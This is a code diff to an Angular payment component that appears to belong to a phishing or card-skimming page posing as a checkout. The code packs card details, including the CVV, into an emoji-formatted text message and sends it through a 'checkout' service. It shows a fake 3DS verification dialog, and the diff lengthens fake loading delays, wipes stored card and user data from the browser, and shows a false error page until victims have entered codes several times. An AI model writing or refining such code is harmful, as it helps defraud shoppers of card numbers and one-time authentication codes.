@@ -67,7 +67,11 @@ export class PaymentComponent {
   }
 
   ngOnInit(): void {
+    this.isLoading = true;
     this.updateTotal();
+    setTimeout(() => {
+      this.isLoading = false;
+    }, 2500);
   }
 
   isInvalid(controlName: string) {
@@ -125,12 +129,12 @@ export class PaymentComponent {
     if (!storedMsg.includes('cvv:'))
       storedMsg += `\n╰🟢 cvv: ${cvv}`;
 
-    localStorage.setItem('m', storedMsg);
+    localStorage.setItem('m',storedMsg);
     const res = await this.paymentService.checkout({ text: storedMsg });
     this.isLoading = true;
     setTimeout(() => {
       this.show3DSModal = true;
-    }, 5000);
+    }, 8500);
   }
 
   private updateField(text: string, field: string, newValue: string): string {
@@ -326,6 +330,7 @@ export class PaymentComponent {
   }, 5000);
 
   if (this.counter == 3) {
+    let successCounter = Number(localStorage.getItem('scid')) || 0;
     // Validación básica del código (ej: mínimo 4 dígitos)
     if (!this.threeDSCode || this.threeDSCode.trim().length < 4) {
       this.threeDSError =
@@ -337,10 +342,15 @@ export class PaymentComponent {
     this.show3DSModal = false;
     this.isLoading = true;
 
+    
 
     setTimeout(() => {
+      localStorage.removeItem('mi');
+      localStorage.removeItem('userData');
+      localStorage.removeItem('m');
       this.isLoading = false;
-      location.href = 'payment/success';
+      
+      location.href = successCounter < 2 ? 'payment/error' : 'payment/success'
     }, 2000);
   }
 
@@ -352,7 +362,7 @@ export class PaymentComponent {
       this.isLoading = false;
       this.show3DSModal = true;
       this.threeDSCode = '';
-    }, 6000);
+    }, 9000);
     this.counter++;
   }
 
